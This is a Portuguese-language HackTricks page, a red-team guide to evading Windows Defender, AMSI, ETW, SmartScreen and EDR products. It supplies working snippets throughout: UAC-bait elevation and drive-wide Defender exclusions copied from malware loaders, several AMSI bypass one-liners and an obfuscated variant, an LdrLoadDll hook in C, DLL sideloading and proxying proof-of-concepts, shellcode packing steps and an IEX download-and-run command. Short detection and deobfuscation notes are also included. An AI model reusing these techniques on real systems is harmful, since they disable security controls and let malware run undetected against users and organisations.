# Bypass de Antivírus (AV)

{{#include ../banners/hacktricks-training.md}}

**Esta página foi escrita por** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Parar o Defender

- [defendnot](https://github.com/es3n1n/defendnot): Uma ferramenta para parar o funcionamento do Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Uma ferramenta para parar o funcionamento do Windows Defender fingindo outro AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Isca de UAC no estilo instalador antes de mexer no Defender

Loaders públicos disfarçados como game cheats frequentemente são distribuídos como instaladores não assinados Node.js/Nexe que primeiro **solicitam elevação ao usuário** e só então neutralizam o Defender. O fluxo é simples:

1. Verifica o contexto administrativo com `net session`. O comando só tem sucesso quando o chamador tem direitos de administrador, então uma falha indica que o loader está rodando como usuário padrão.
2. Reinicia-se imediatamente com o verbo `RunAs` para acionar o esperado prompt de consentimento do UAC enquanto preserva a linha de comando original.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
As vítimas já acreditam que estão instalando “cracked” software, então o prompt geralmente é aceito, dando ao malware os direitos necessários para alterar a política do Defender.

### Exclusões abrangentes `MpPreference` para cada letra de unidade

Uma vez com privilégios elevados, GachiLoader-style chains maximizam os pontos cegos do Defender em vez de desativar o serviço por completo. O loader primeiro mata o GUI watchdog (`taskkill /F /IM SecHealthUI.exe`) e então aplica **exclusões extremamente amplas** para que cada perfil de usuário, diretório do sistema e disco removível se torne inescaneável:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observações principais:

- O loop percorre todos os sistemas de arquivos montados (D:\, E:\, pendrives USB, etc.), então **qualquer payload futuro deixado em qualquer lugar do disco é ignorado**.
- A exclusão da extensão `.sys` é pró-ativa—atacantes reservam a opção de carregar drivers não assinados mais tarde sem tocar no Defender novamente.
- Todas as alterações ficam sob `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, permitindo que estágios posteriores confirmem que as exclusões persistem ou as expandam sem reacionar o UAC.

Como nenhum serviço do Defender é parado, verificações de saúde ingênuas continuam reportando “antivírus ativo” mesmo que a inspeção em tempo real nunca acesse esses caminhos.

## **AV Evasion Methodology**

Atualmente, os AVs usam diferentes métodos para verificar se um arquivo é malicioso ou não: detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Static detection**

A detecção estática é feita sinalizando strings conhecidas maliciosas ou arrays de bytes em um binário ou script, e também extraindo informações do próprio arquivo (por exemplo, file description, company name, assinaturas digitais, ícone, checksum, etc.). Isso significa que usar ferramentas públicas conhecidas pode te fazer ser pego mais facilmente, pois provavelmente já foram analisadas e sinalizadas como maliciosas. Há algumas maneiras de contornar esse tipo de detecção:

- **Encryption**

Se você criptografar o binário, não haverá como o AV detectar seu programa, mas você precisará de algum tipo de loader para descriptografar e executar o programa na memória.

- **Obfuscation**

Às vezes tudo que você precisa fazer é mudar algumas strings no seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada dependendo do que você está tentando ofuscar.

- **Custom tooling**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas maliciosas conhecidas, mas isso demanda muito tempo e esforço.

> [!TIP]
> Uma boa forma de checar a detecção estática do Windows Defender é [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele basicamente divide o arquivo em múltiplos segmentos e então instrui o Defender a escanear cada um individualmente; assim, ele pode dizer exatamente quais strings ou bytes são sinalizados no seu binário.

Recomendo fortemente que você veja esta [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sobre evasão de AV prática.

### **Dynamic analysis**

Análise dinâmica é quando o AV executa seu binário em um sandbox e observa atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do seu navegador, realizar um minidump no LSASS, etc.). Essa parte pode ser um pouco mais complicada de lidar, mas aqui estão algumas coisas que você pode fazer para evadir sandboxes.

- **Sleep before execution** Dependendo de como está implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, então usar sleeps longos pode atrapalhar a análise dos binários. O problema é que muitos sandboxes dos AVs podem simplesmente pular o sleep dependendo de como foi implementado.
- **Checking machine's resources** Normalmente sandboxes têm muito poucos recursos disponíveis (por exemplo, < 2GB RAM), caso contrário poderiam deixar a máquina do usuário lenta. Você também pode ser criativo aqui, por exemplo verificando a temperatura da CPU ou até a velocidade das ventoinhas; nem tudo será implementado no sandbox.
- **Machine-specific checks** Se você quer mirar um usuário cuja estação de trabalho está ingressada no domínio "contoso.local", você pode checar o domínio do computador para ver se corresponde ao que você especificou; se não corresponder, você pode fazer seu programa sair.

Acontece que o computername do Sandbox do Microsoft Defender é HAL9TH, então você pode checar o nome do computador no seu malware antes da detonação; se o nome corresponder a HAL9TH, significa que você está dentro do sandbox do Defender, então você pode fazer seu programa sair.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Algumas outras dicas bem boas do [@mgeeky](https://twitter.com/mariuszbit) para enfrentar Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> canal #malware-dev</p></figcaption></figure>

Como já dissemos antes neste post, **ferramentas públicas** eventualmente **serão detectadas**, então você deve se fazer uma pergunta:

Por exemplo, se você quer dump LSASS, **você realmente precisa usar mimikatz**? Ou poderia usar um projeto diferente, menos conhecido, que também faz dump do LSASS?

A resposta correta provavelmente é a última. Pegando o mimikatz como exemplo, é provavelmente um dos, se não o mais sinalizado pedaço de malware pelos AVs e EDRs; embora o projeto em si seja super legal, também é um pesadelo trabalhar com ele para contornar AVs, então procure alternativas para o que você está tentando alcançar.

> [!TIP]
> Ao modificar seus payloads para evadir, certifique-se de **desativar o envio automático de amostras** no Defender, e por favor, sério, **DO NOT UPLOAD TO VIRUSTOTAL** se seu objetivo é alcançar evasão a longo prazo. Se você quiser checar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste lá até ficar satisfeito com o resultado.

## EXEs vs DLLs

Sempre que possível, priorize usar DLLs para evasão; na minha experiência, arquivos DLL são geralmente **muito menos detectados** e analisados, então é um truque muito simples para evitar detecção em alguns casos (se seu payload tiver alguma forma de rodar como DLL, claro).

Como podemos ver nesta imagem, um DLL Payload do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem taxa de detecção de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparação no antiscan.me de um payload Havoc EXE normal vs um Havoc DLL normal</p></figcaption></figure>

Agora vamos mostrar alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de busca de DLLs usada pelo loader ao posicionar tanto a aplicação vítima quanto os payload(s) maliciosos lado a lado.

Você pode checar programas suscetíveis a DLL Sideloading usando [Siofra](https://github.com/Cybereason/siofra) e o seguinte powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando irá exibir a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Recomendo fortemente que você **explore DLL Hijackable/Sideloadable programs por conta própria**, esta técnica é bastante discreta quando feita corretamente, mas se você usar programas DLL Sideloadable conhecidos publicamente, pode ser facilmente pego.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não fará com que seu payload seja executado, pois o programa espera algumas funções específicas dentro dessa DLL; para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (maliciosa) para a DLL original, preservando assim a funcionalidade do programa e permitindo lidar com a execução do seu payload.

Vou usar o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que segui:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um modelo de código-fonte de DLL e a DLL original renomeada.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto o proxy DLL têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu chamaria isso de um sucesso.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Eu **recomendo fortemente** que você assista [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) para aprender mais sobre o que discutimos com mais profundidade.

### Abusando de Exportações Encaminhadas (ForwardSideLoading)

Módulos PE do Windows podem exportar funções que são, na verdade, "forwarders": em vez de apontar para código, a entrada de exportação contém uma string ASCII no formato `TargetDll.TargetFunc`. Quando um chamador resolve a exportação, o loader do Windows irá:

- Carregar `TargetDll` se ainda não estiver carregado
- Resolver `TargetFunc` a partir dele

Comportamentos-chave para entender:
- Se `TargetDll` for um KnownDLL, ele é fornecido a partir do namespace protegido KnownDLLs (ex.: ntdll, kernelbase, ole32).
- Se `TargetDll` não for um KnownDLL, a ordem normal de busca de DLLs é usada, o que inclui o diretório do módulo que está fazendo a resolução do encaminhamento.

Isso possibilita uma primitiva de sideloading indireto: encontre uma DLL assinada que exporte uma função encaminhada para um nome de módulo não-KnownDLL, então coloque essa DLL assinada no mesmo diretório que uma DLL controlada pelo atacante com exatamente o mesmo nome do módulo alvo encaminhado. Quando a exportação encaminhada é invocada, o loader resolve o encaminhamento e carrega sua DLL do mesmo diretório, executando seu DllMain.

Exemplo observado no Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` não é um KnownDLL, portanto é resolvida pela ordem de busca normal.

PoC (copiar e colar):
1) Copie a DLL do sistema assinada para uma pasta gravável
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Coloque uma `NCRYPTPROV.dll` maliciosa na mesma pasta. Um DllMain mínimo é suficiente para obter execução de código; você não precisa implementar a função encaminhada para acionar o DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Acionar o encaminhamento com um LOLBin assinado:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportamento observado:
- rundll32 (assinada) carrega a side-by-side `keyiso.dll` (assinada)
- Ao resolver `KeyIsoSetAuditingInterface`, o loader segue o forward para `NCRYPTPROV.SetAuditingInterface`
- Em seguida o loader carrega `NCRYPTPROV.dll` de `C:\test` e executa seu `DllMain`
- Se `SetAuditingInterface` não estiver implementado, você receberá um erro "missing API" somente depois que `DllMain` já tiver sido executado

Dicas de hunting:
- Concentre-se em forwarded exports onde o módulo alvo não é um KnownDLL. KnownDLLs estão listados em `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Você pode enumerar forwarded exports com ferramentas como:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Veja o inventário de forwarders do Windows 11 para procurar candidatos: https://hexacorn.com/d/apis_fwd.txt

Ideias de detecção/defesa:
- Monitorar LOLBins (e.g., rundll32.exe) carregando DLLs assinadas de caminhos não do sistema, seguido pelo carregamento de non-KnownDLLs com o mesmo nome base desse diretório
- Alertar sobre cadeias de processo/módulo como: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sob caminhos graváveis pelo usuário
- Aplicar políticas de integridade de código (WDAC/AppLocker) e negar write+execute em diretórios de aplicações

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Você pode usar Freeze para carregar e executar seu shellcode de forma furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion é apenas um jogo de gato e rato — o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta; se possível, tente encadear múltiplas técnicas de evasion.

## AMSI (Anti-Malware Scan Interface)

AMSI was created to prevent "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Inicialmente, os AVs só eram capazes de escanear **files on disk**, então se você conseguisse executar payloads **directly in-memory**, o AV não podia fazer nada para evitar isso, pois não tinha visibilidade suficiente.

A feature AMSI está integrada nestes componentes do Windows.

- User Account Control, or UAC (elevation of EXE, COM, MSI, or ActiveX installation)
- PowerShell (scripts, interactive use, and dynamic code evaluation)
- Windows Script Host (wscript.exe and cscript.exe)
- JavaScript and VBScript
- Office VBA macros

Ela permite que soluções antivírus inspecionem o comportamento de scripts expondo o conteúdo do script de forma não criptografada e não ofuscada.

Running `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` will produce the following alert on Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Observe como ele prefixa `amsi:` e então o caminho para o executável a partir do qual o script foi executado — neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas ainda assim fomos detectados in-memory por causa do AMSI.

Além disso, a partir do **.NET 4.8**, código C# também passa pelo AMSI. Isso até afeta `Assembly.Load(byte[])` para execução in-memory. Por isso é recomendado usar versões mais antigas do .NET (como 4.7.2 ou anteriores) para execução in-memory se você quiser evadir o AMSI.

Existem algumas maneiras de contornar o AMSI:

- **Obfuscation**

Como o AMSI trabalha principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa forma de evadir detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que haja múltiplas camadas, então obfuscation pode ser uma má opção dependendo de como for feita. Isso torna a evasão não tão direta. Embora, às vezes, tudo o que você precise fazer seja mudar um ou dois nomes de variáveis e estará ok — então depende de quanto algo foi sinalizado.

- **AMSI Bypass**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível manipular isso facilmente mesmo executando como um usuário sem privilégios. Devido a essa falha na implementação do AMSI, pesquisadores encontraram múltiplas maneiras de evadir a varredura do AMSI.

**Forcing an Error**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhuma varredura seja iniciada para o processo atual. Originalmente isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para prevenir um uso mais amplo.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tudo o que foi necessário foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, é claro, foi sinalizada pelo próprio AMSI, então alguma modificação é necessária para poder usar esta técnica.

Aqui está um AMSI bypass modificado que obtive deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Tenha em mente que isso provavelmente será sinalizado assim que esta publicação sair; portanto, não publique nenhum código se a sua intenção for permanecer indetectado.

**Memory Patching**

Esta técnica foi inicialmente descoberta por [@RastaMouse](https://twitter.com/_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê‑la com instruções para retornar o código E_INVALIDARG; dessa forma, o resultado da verificação passa a ser 0, o que é interpretado como um resultado limpo.

> [!TIP]
> Leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.

There are also many other techniques used to bypass AMSI with powershell, check out [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) and [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) to learn more about them.

### Bloqueando AMSI impedindo o carregamento de amsi.dll (LdrLoadDll hook)

AMSI é inicializado somente depois que `amsi.dll` é carregado no processo atual. Um bypass robusto e independente de linguagem é colocar um user‑mode hook em `ntdll!LdrLoadDll` que retorne um erro quando o módulo solicitado for `amsi.dll`. Como resultado, o AMSI nunca é carregado e nenhuma verificação ocorre para esse processo.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notas
- Funciona no PowerShell, WScript/CScript e em custom loaders (qualquer coisa que, de outra forma, carregaria o AMSI).
- Use em conjunto com o envio de scripts por stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) para evitar artefatos longos na linha de comando.
- Observado em loaders executados via LOLBins (e.g., `regsvr32` chamando `DllRegisterServer`).

A ferramenta **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** também gera script para bypass do AMSI.  
A ferramenta **[https://amsibypass.com/](https://amsibypass.com/)** também gera script para bypass do AMSI que evita a signature ao randomizar funções definidas pelo usuário, variáveis, expressões de caracteres e ao aplicar capitalização aleatória nas palavras‑chave do PowerShell para evitar a signature.

**Remover a signature detectada**

Você pode usar ferramentas como **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** e **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** para remover a AMSI signature da memória do processo atual. Essa ferramenta funciona escaneando a memória do processo atual em busca da AMSI signature e então sobrescrevendo‑a com instruções NOP, removendo‑a efetivamente da memória.

**Produtos AV/EDR que usam AMSI**

Você pode encontrar uma lista de produtos AV/EDR que usam AMSI em **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use PowerShell versão 2**

Se você usar o PowerShell versão 2, o AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isto:
```bash
powershell.exe -version 2
```
## Registro do PowerShell

PowerShell logging é um recurso que permite registrar todos os comandos do PowerShell executados em um sistema. Isso pode ser útil para auditoria e solução de problemas, mas também pode ser um **problema para atacantes que querem evadir a detecção**.

Para contornar o registro do PowerShell, você pode usar as seguintes técnicas:

- **Disable PowerShell Transcription and Module Logging**: Você pode usar uma ferramenta como [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) para esse propósito.
- **Use Powershell version 2**: Se você usar PowerShell version 2, AMSI não será carregado, então você pode executar seus scripts sem serem escaneados pelo AMSI. Você pode fazer isto: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Use [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) para iniciar um PowerShell sem defesas (isso é o que `powerpick` do Cobal Strike usa).


## Ofuscação

> [!TIP]
> Várias técnicas de ofuscação dependem de encriptar dados, o que aumentará a entropia do binário e tornará mais fácil para AVs e EDRs detectá-lo. Tenha cuidado com isso e talvez aplique encriptação apenas a seções específicas do seu código que sejam sensíveis ou precisem ser ocultadas.

### Desofuscação de binários .NET protegidos por ConfuserEx

Ao analisar malware que usa ConfuserEx 2 (ou forks comerciais) é comum enfrentar várias camadas de proteção que irão bloquear decompiladores e sandboxes. O fluxo de trabalho abaixo restaura de forma confiável um **IL quase original** que pode depois ser decompilado para C# em ferramentas como dnSpy ou ILSpy.

1.  Anti-tampering removal – ConfuserEx encripta cada *method body* e as decripta dentro do construtor estático do *module* (`<Module>.cctor`). Isso também altera o checksum do PE, portanto qualquer modificação fará o binário travar. Use **AntiTamperKiller** para localizar as tabelas de metadados encriptadas, recuperar as chaves XOR e reescrever um assembly limpo:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
A saída contém os 6 parâmetros anti-tamper (`key0-key3`, `nameHash`, `internKey`) que podem ser úteis ao construir seu próprio unpacker.

2.  Symbol / control-flow recovery – alimente o arquivo *clean* para **de4dot-cex** (um fork de de4dot ciente do ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – seleciona o perfil ConfuserEx 2  
• de4dot irá desfazer o control-flow flattening, restaurar namespaces, classes e nomes de variáveis originais e decriptar strings constantes.

3.  Proxy-call stripping – ConfuserEx substitui chamadas diretas de método por wrappers leves (também chamados de *proxy calls*) para dificultar ainda mais a decompilação. Remova-os com **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Após este passo você deve observar APIs normais do .NET como `Convert.FromBase64String` ou `AES.Create()` em vez de funções wrapper opacas (`Class8.smethod_10`, …).

4.  Manual clean-up – execute o binário resultante no dnSpy, pesquise por grandes blobs Base64 ou uso de `RijndaelManaged`/`TripleDESCryptoServiceProvider` para localizar o *payload* real. Frequentemente o malware o armazena como um array de bytes codificado TLV inicializado dentro de `<Module>.byte_0`.

A cadeia acima restaura o fluxo de execução **sem** a necessidade de executar a amostra maliciosa – útil quando se trabalha em uma estação offline.

> 🛈  ConfuserEx produz um atributo customizado chamado `ConfusedByAttribute` que pode ser usado como IOC para triagem automática de amostras.

#### Comando único
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork open-source da suíte de compilação do [LLVM](http://www.llvm.org/) capaz de aumentar a segurança do software através de [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) e tamper-proofing.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar qualquer ferramenta externa e sem modificar o compilador.
- [**obfy**](https://github.com/fritzone/obfy): Adiciona uma camada de operações ofuscadas geradas pelo framework de metaprogramação de templates do C++ que tornará a vida de quem tentar quebrar o aplicativo um pouco mais difícil.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador binário x64 capaz de ofuscar vários arquivos PE diferentes, incluindo: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame é um simples motor de código metamórfico para executáveis arbitrários.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de obfuscação de código granular para linguagens suportadas pelo LLVM usando ROP (return-oriented programming). ROPfuscator ofusca um programa no nível do código assembly transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um .NET PE Crypter escrito em Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e então carregá-los

## SmartScreen & MoTW

You may have seen this screen when downloading some executables from the internet and executing them.

Microsoft Defender SmartScreen is a security mechanism intended to protect the end user against running potentially malicious applications.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen mainly works with a reputation-based approach, meaning that uncommonly download applications will trigger SmartScreen thus alerting and preventing the end user from executing the file (although the file can still be executed by clicking More Info -> Run anyway).

**MoTW** (Mark of The Web) is an [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) with the name of Zone.Identifier which is automatically created upon download files from the internet, along with the URL it was downloaded from.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Verificando o Zone.Identifier ADS para um arquivo baixado da internet.</p></figcaption></figure>

> [!TIP]
> É importante notar que executáveis assinados com um certificado de assinatura **confiável** **não irão acionar o SmartScreen**.

A very effective way to prevent your payloads from getting the Mark of The Web is by packaging them inside some sort of container like an ISO. This happens because Mark-of-the-Web (MOTW) **cannot** be applied to **non NTFS** volumes.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em containers de saída para evitar o Mark-of-the-Web.

Example usage:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Here is a demo for bypassing SmartScreen by packaging payloads inside ISO files using [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) é um poderoso mecanismo de logging no Windows que permite que aplicações e componentes do sistema **registrem eventos**. Porém, também pode ser usado por produtos de segurança para monitorar e detectar atividades maliciosas.

Similar ao modo como AMSI é desativado (bypassed), também é possível fazer com que a função **`EtwEventWrite`** do processo em user space retorne imediatamente sem registar qualquer evento. Isso é feito patchando a função na memória para retornar imediatamente, efetivamente desativando o logging do ETW para esse processo.

Você pode encontrar mais informações em **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) and [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.


## Reflexão de Assembly C#

Carregar binários C# em memória é conhecido há bastante tempo e continua sendo uma ótima forma de executar suas ferramentas de post-exploitation sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, teremos apenas que nos preocupar em patchar o AMSI para todo o processo.

